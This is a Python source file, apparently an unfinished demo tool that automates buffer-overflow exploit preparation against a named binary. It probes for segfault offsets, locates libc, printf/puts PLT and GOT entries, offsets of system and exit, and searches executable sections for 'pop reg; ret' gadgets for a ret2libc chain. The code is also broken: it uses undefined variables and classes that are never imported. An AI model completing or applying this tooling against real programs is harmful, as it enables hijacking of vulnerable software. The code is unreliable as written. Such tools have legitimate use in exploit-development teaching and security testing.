#TODO: need find_segfault
# from find_segfault import find_segfault
import click
import os

# accept filename as parameter
program_name = click.prompt('Please enter a program name', type=str)

print("Program name is", program_name)

print("Please select method of probing for buffer overflow:")
print("1 - probe with payload as argument")
print("2 - probe with payload as filename")
print("3 - probe with payload as argument and filename")
print("4 - automate probing (default)")

probe_mode = 0
valid_probing_mode = False
while valid_probing_mode == False:
    probe_mode = click.prompt('Method:', type=int, default=4)
    if probe_mode in [1,2,3,4]:
        valid_probing_mode = True
    else:
        print('Invalid method, try again')

# TODO: get maximum payload size
max_payload_size = 0
valid_payload_size = False
while valid_payload_size == False:
    max_payload_size = click.prompt('Please enter maximum payload size', type=int)
    if max_payload_size > 0:
        valid_payload_size = True

# TODO: get arguments if mode 1 and 3 are selected

# TODO: get filename if 2 and 3 are selected
start_payload_name = ''
if probe_mode == 2 or probe_mode == 3:
    start_payload_name = click.prompt('Please enter name of payload file', type=str)

# TODO: need find_segfault here

if len(effective_payload_file) > 0:
    start_payload_name = effective_payload_file

if has_segfault:
    print("Segfault found at", segfault_address)
    print("Segfault offset is", segfault_offset)
else:
    # TODO: what if segfault not found?
    print("No segfault found")


# check for libc
b_handler = Bin_handler(program_name)
if b_handler.has_libc() == True:
    print("Found libc at", b_handler.libc_path)

else:
    print("Libc not found")
    exit()

# check for plt sections, we want printf or puts that will be used for leaking the libc address
# for GOT address, we are interested .got.plt section of "readelf -S binary_file"
found_printf, printf_plt, printf_got = b_handler.search_plt_and_got_function(program_name, 'printf')
found_printf = False
found_puts, puts_plt, puts_got = b_handler.search_plt_and_got_function(program_name, 'puts')

if found_printf:
    print("Found printf@plt", printf_plt)
    print("Found printf@got", printf_got)

if found_puts:
    print("Found puts@plt", puts_plt)
    print("Found puts@got", puts_got)

# check for address of important functions
system_found, system_address_offset = b_handler.search_function(b_handler.libc_path, 'system')
printf_found, printf_address_offset = b_handler.search_function(b_handler.libc_path, 'printf')
puts_found, puts_address_offset = b_handler.search_function(b_handler.libc_path, 'puts')
exit_found, exit_address_offset = b_handler.search_function(b_handler.libc_path, 'exit')
sstart_found, sstart_address = b_handler.search_asm_function(program_name, '_start')

print("Offset of system", system_address_offset)
print("Offset of printf", printf_address_offset)
print("Offset of puts", puts_address_offset)
print("offset of exit", exit_address_offset)
print("Address of _start", sstart_address)


click.confirm('[Demo pause] Press any key to continue searching for gadget', default="y")
print("")

# find any gadget pop register; ret;
executable_sections = b_handler.get_executable_sections(program_name)
gfinder = Gadget_finder(program_name)
found_gadget = False
gadget_address = ''
popregret_address = ''
for esection in executable_sections:
    print("Checking executable section", esection)
    esec_add_int = int(executable_sections[esection][0], 16)
    esec_start_int = int(executable_sections[esection][1], 16)
    esec_end_int = esec_start_int + int(executable_sections[esection][2], 16)
    found_gadget, gadget_address = gfinder.find("0x([a-f0-9]+):\spop\se\w?x;\s?(0x[a-f0-9]+):\s?ret\s?;", esec_start_int, esec_end_int)
    if found_gadget:
        print("Found gadget in section", esection, "at offset", gadget_address)
        popregret_address = esec_add_int + int(gadget_address, 16)
        break

click.confirm('[Demo pause] Press any key to continue', default="y")
print("")


# finally, do cleanup of file ??
# try:
#     if len(start_payload_name) > 0:
#         os.unlink(start_payload_name)
# except:
#     print("Unable to delete payload file during cleanup", start_payload_name)